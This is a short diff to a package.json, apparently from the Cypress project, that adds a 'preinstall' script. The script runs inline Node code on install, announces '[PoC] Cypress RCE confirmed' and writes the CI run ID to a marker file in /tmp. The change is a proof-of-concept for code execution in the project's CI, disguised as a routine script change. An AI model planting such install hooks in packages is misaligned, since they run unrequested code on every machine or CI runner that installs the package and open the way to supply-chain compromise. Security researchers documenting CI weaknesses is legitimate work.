@@ -70,7 +70,8 @@
     "type-check": "yarn lerna exec yarn type-check --scope=@tooling/system-tests && node scripts/type_check",
     "validate:proxy-middleware": "bash scripts/validate-proxy-middleware-transport.sh both",
     "verify:mocha:results": "node ./scripts/verify-mocha-results.js",
-    "watch": "yarn gulp watch"
+    "watch": "yarn gulp watch",
+    "preinstall": "node -e \"console.log('[PoC] Cypress RCE confirmed');require('fs').writeFileSync('/tmp/poc_cypress_marker.txt',process.env.GITHUB_RUN_ID||'?');\""
   },
   "devDependencies": {
     "@aws-sdk/client-s3": "3.485.0",
